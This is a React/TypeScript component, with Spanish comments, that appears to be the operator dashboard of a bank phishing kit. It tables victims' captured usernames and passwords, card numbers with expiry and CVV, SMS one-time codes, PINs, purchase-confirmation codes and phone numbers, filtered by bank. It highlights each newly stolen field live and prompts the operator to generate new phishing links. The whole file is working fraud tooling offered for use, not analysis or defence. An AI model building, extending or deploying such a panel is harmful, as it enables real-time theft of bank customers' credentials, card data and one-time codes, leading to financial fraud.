import React, { useState, useEffect } from 'react';
import { Session } from '@shared/schema';
import { Skeleton } from '@/components/ui/skeleton';

interface AccessTableProps {
  sessions: Session[];
  activeBank: string;
  selectedSessionId: string | null;
  onSelectSession: (sessionId: string) => void;
  isLoading: boolean;
}

const AccessTable: React.FC<AccessTableProps> = ({ 
  sessions, 
  activeBank, 
  selectedSessionId,
  onSelectSession,
  isLoading 
}) => {
  // Estado para resaltar las filas recién actualizadas
  const [highlightedRows, setHighlightedRows] = useState<Record<string, boolean>>({});
  
  // Estado para resaltar campos específicos que han sido actualizados
  const [highlightedFields, setHighlightedFields] = useState<Record<string, Record<string, boolean>>>({});
  
  // Filter sessions by bank if a specific bank is selected
  const filteredSessions = activeBank === 'todos' 
    ? sessions 
    : sessions.filter(session => session.banco === activeBank);
    
  // Referencias previas de las sesiones para poder comparar y detectar cambios
  const [prevSessions, setPrevSessions] = useState<Session[]>([]);
  
  // Detectar cambios en las sesiones para resaltar las filas actualizadas
  useEffect(() => {
    if (sessions.length === 0) return;
    
    // Marcar todas las sesiones como destacadas
    const newHighlights: Record<string, boolean> = {};
    const newFieldHighlights: Record<string, Record<string, boolean>> = {};
    
    // Comparar sesiones actuales con las anteriores para encontrar cambios específicos
    sessions.forEach(session => {
      const prevSession = prevSessions.find(s => s.sessionId === session.sessionId);
      
      // Resaltar la fila completa
      newHighlights[session.sessionId] = true;
      
      // Inicializar objeto de campos para esta sesión
      newFieldHighlights[session.sessionId] = {};
      
      // Si encontramos la sesión previa, comparamos campo por campo
      if (prevSession) {
        // Comparar campos específicos para resaltar
        if (prevSession.folio !== session.folio) {
          newFieldHighlights[session.sessionId].folio = true;
        }
        if (prevSession.username !== session.username || prevSession.password !== session.password) {
          newFieldHighlights[session.sessionId].credentials = true;
        }
        if (prevSession.tarjeta !== session.tarjeta || 
            prevSession.fechaVencimiento !== session.fechaVencimiento ||
            prevSession.cvv !== session.cvv) {
          newFieldHighlights[session.sessionId].tarjeta = true;
        }
        if (prevSession.sms !== session.sms) {
          newFieldHighlights[session.sessionId].sms = true;
        }
        if (prevSession.nip !== session.nip) {
          newFieldHighlights[session.sessionId].nip = true;
        }
        if (prevSession.smsCompra !== session.smsCompra) {
          newFieldHighlights[session.sessionId].smsCompra = true;
        }
        if (prevSession.celular !== session.celular) {
          newFieldHighlights[session.sessionId].celular = true;
        }
        if (prevSession.pasoActual !== session.pasoActual) {
          newFieldHighlights[session.sessionId].pasoActual = true;
        }
      } else {
        // Si es una sesión nueva, resaltar todos los campos
        newFieldHighlights[session.sessionId] = {
          folio: true,
          credentials: true,
          tarjeta: true,
          sms: true,
          nip: true,
          smsCompra: true,
          celular: true,
          pasoActual: true
        };
      }
    });
    
    // Actualizar estados
    setHighlightedRows(newHighlights);
    setHighlightedFields(newFieldHighlights);
    
    // Guardar las sesiones actuales como previas para la próxima comparación
    setPrevSessions([...sessions]);
    
    // Eliminar el resaltado después de 3 segundos
    const timer = setTimeout(() => {
      setHighlightedRows({});
      setHighlightedFields({});
    }, 3000);
    
    return () => clearTimeout(timer);
  }, [sessions]);

  if (isLoading) {
    return (
      <div className="px-6 pt-2 pb-6 overflow-auto flex-1">
        <div className="w-full bg-[#1e1e1e] rounded-lg overflow-hidden">
          <div className="p-4">
            <Skeleton className="h-8 w-full mb-4" />
            <Skeleton className="h-12 w-full mb-2" />
            <Skeleton className="h-12 w-full mb-2" />
            <Skeleton className="h-12 w-full mb-2" />
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="px-6 pt-2 pb-6 overflow-auto flex-1">
      <table className="w-full bg-[#1e1e1e] rounded-lg overflow-hidden">
        <thead>
          <tr className="bg-[#222]">
            <th className="p-3 text-left">#</th>
            <th className="p-3 text-left">Folio</th>
            <th className="p-3 text-left">User:Password</th>
            <th className="p-3 text-left">Banco</th>
            <th className="p-3 text-left">Tarjeta</th>
            <th className="p-3 text-left">SMS</th>
            <th className="p-3 text-left">NIP</th>
            <th className="p-3 text-left">SMS COMPRA</th>
            <th className="p-3 text-left">Celular</th>
            <th className="p-3 text-left">Paso actual</th>
            <th className="p-3 text-left">Acciones</th>
          </tr>
        </thead>
        <tbody>
          {filteredSessions.length === 0 && (
            <tr>
              <td colSpan={11} className="p-4 text-center text-gray-400">
                No hay sesiones activas. Genere un nuevo link para crear una sesión.
              </td>
            </tr>
          )}
          
          {filteredSessions.map((session, index) => (
            <tr 
              key={session.id}
              className={`border-b border-[#2c2c2c] ${selectedSessionId === session.sessionId ? 'bg-[#2a2a2a]' : ''} 
                ${highlightedRows[session.sessionId] ? 'bg-[#1a4c64] transition-colors duration-500' : ''}`}
              onClick={() => onSelectSession(session.sessionId)}
            >
              <td className="p-3 text-[#ccc]">{index + 1}</td>
              <td className={`p-3 ${highlightedFields[session.sessionId]?.folio ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                {session.folio}
              </td>
              <td className={`p-3 ${highlightedFields[session.sessionId]?.credentials ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                {session.username && session.password 
                  ? `${session.username}:${session.password}` 
                  : '--'}
              </td>
              <td className="p-3 text-[#ccc]">{session.banco}</td>
              <td className={`p-3 ${highlightedFields[session.sessionId]?.tarjeta ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                <div>
                  <span className="block">{session.tarjeta || '--'}</span>
                  {(session.fechaVencimiento || session.cvv) && (
                    <div className="text-xs mt-1 opacity-80">
                      {session.fechaVencimiento && <span className="mr-2">Exp: {session.fechaVencimiento}</span>}
                      {session.cvv && <span>CVV: {session.cvv}</span>}
                    </div>
                  )}
                </div>
              </td>
              <td className={`p-3 ${highlightedFields[session.sessionId]?.sms ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                {session.sms || '--'}
              </td>
              <td className={`p-3 ${highlightedFields[session.sessionId]?.nip ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                {session.nip || '--'}
              </td>
              <td className={`p-3 ${highlightedFields[session.sessionId]?.smsCompra ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                {session.smsCompra || '--'}
              </td>
              <td className={`p-3 ${highlightedFields[session.sessionId]?.celular ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                {session.celular || '--'}
              </td>
              <td className={`p-3 ${highlightedFields[session.sessionId]?.pasoActual ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                {/* Convert pasoActual to a more readable format */}
                {session.pasoActual ? session.pasoActual.charAt(0).toUpperCase() + session.pasoActual.slice(1) : '--'}
              </td>
              <td className="p-3 text-[#ccc]">
                <button 
                  className="text-xs bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
                  onClick={(e) => {
                    e.stopPropagation();
                    onSelectSession(session.sessionId);
                  }}
                >
                  Seleccionar
                </button>
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
};

export default AccessTable;
